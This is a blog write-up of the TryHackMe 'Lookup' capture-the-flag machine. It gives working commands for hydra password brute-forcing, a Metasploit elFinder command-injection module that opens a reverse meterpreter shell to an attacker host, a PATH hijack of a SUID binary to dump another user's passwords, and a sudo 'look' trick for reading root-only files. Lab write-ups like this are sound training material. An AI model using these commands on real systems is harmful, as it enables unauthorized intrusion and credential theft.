---
title: "Lookup"
date: 2024-03-11
draft: false
summary: "Writeup for Lookup CTF challenge on TryHackMe."
tags: ["linux", "suid", "rce", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/lookup/cover.webp"
  caption: "Lookup TryHackMe Challenge"
  alt: "Lookup cover"
platform: "TryHackMe"
---

Test your enumeration skills on this boot-to-root machine.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/lookup

## Reconnaissance

I performed an **nmap** aggressive scan to identify open ports and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN lookup.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/lookup/1.webp)

## Foothold

The **nmap** scan revealed an **http** server running on the target, so I accessed it through my browser and landed on a login page.

![](https://cdn.ziomsec.com/lookup/2.webp)

I tried logging in using some default credentials and observed a change in response when a valid username was used.

![](https://cdn.ziomsec.com/lookup/3.webp)

![](https://cdn.ziomsec.com/lookup/4.webp)

This behavior could be exploited to find valid usernames, so I bruteforced valid usernames using **burpsuite**'s **intruder** from **seclists**.

![](https://cdn.ziomsec.com/lookup/5.webp)

![](https://cdn.ziomsec.com/lookup/6.webp)

Hence I successfully found another user. I tried bruteforcing the password of admin but failed. However, I was successfully able to bruteforce the password of *jose*

```shell
hydra -l 'jose' -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"
```

![](https://cdn.ziomsec.com/lookup/7.webp)

Next, I used the valid credentials to login and was redirected to a subdomain. I added the subdomain to my */etc/hosts* file for appropriate resolution.

This seemed like a file system. I viewed each file but found nothing interesting.

![](https://cdn.ziomsec.com/lookup/9.webp)

I tested the upload functionality by uploading a php script but failed. Then I found the version of the cms being used and looked for available exploits.

![](https://cdn.ziomsec.com/lookup/13.webp)

```shell
searchsploit 'elFinder 2.1.47'
```

![](https://cdn.ziomsec.com/lookup/15.webp)

Since there was an exploit available on **Metasploit**, I booted the **metasploit framework** and selected the exploit.

```
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set LHOST ATTACKER
set RHOSTS files.lookup.thm
run
```

![](https://cdn.ziomsec.com/lookup/16.webp)

I added the appropriate values and ran the exploit to get a **meterpreter** shell.

![](https://cdn.ziomsec.com/lookup/17.webp)

I entered shell mode and spawned a tty shell. I then tried accessing the user flag but failed due to lack of permission. The file system contained some credentials related to the user *think* so I tried switching user using those creds.

![](https://cdn.ziomsec.com/lookup/19.webp)

![](https://cdn.ziomsec.com/lookup/20.webp)

```shell
su -l think
```

However, I failed. I then looked for anything else that could be useful in *think*'s home directory and found a file called *.passwords*

![](https://cdn.ziomsec.com/lookup/22.webp)

I then looked for binaries with suid bit set. The **pwm** binary seemed interesting so I executed it to see what it does.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/lookup/25.webp)

It ran the **id** command and tried extracting passwords from *.passwords* file. I assumed that the whole path of **id** was not being used and hence tried exploiting it. 

I created a **bash** script that echoed the output of **id** command. I used the id of my current user i.e *www-data* (I got it from */etc/passwd*) and replaced the username with *think*. I saved the script as **id**.

```shell
echo '#!/bin/bash' > id
echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" >> id
```

![](https://cdn.ziomsec.com/lookup/27.webp)

I then appended the */tmp* directory at the start of my path variable and ran the **pwm** command to get a list of passwords for the *think* user.

```shell
chmod +x id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```

![](https://cdn.ziomsec.com/lookup/28.webp)

I created a wordlist using these passwords and bruteforced the correct login credentials using **hydra**.

```shell
hydra -l think -P passwords.list ssh://TARGET
```

![](https://cdn.ziomsec.com/lookup/29.webp)

I logged in as *think* and got the user flag from the */home/think* directory.

```shell
ssh -l think TARGET
```

![](https://cdn.ziomsec.com/lookup/31.webp)

## Privilege Escalation

I then looked for **sudo** permissions and found I was allowed to run the **look** command. 

```shell
sudo -l
```

![](https://cdn.ziomsec.com/lookup/32.webp)

I visited **gtfobins** and found a way to use **look** to read the root flag.
- https://gtfobins.github.io/gtfobins/look/#sudo

```shell
LFILE=/root/root.txt
sudo look '' "$LFILE"
```

![](https://cdn.ziomsec.com/lookup/34.webp)

## Closure

Here's a short summary of how I pwned **LOOKUP**:
- I exploited the **cms** vulnerability to get reverse shell as *www-data*.
- I modified the path environment variable and exploited the **pwm** binary containing an suid bit to get passwords of *think* user.
- I captured the user flag from *think*'s home directory.
- I then exploited the **sudo** privileges to read the root flag present in */root* directory.

That's it from my side, until next time :)

---






















































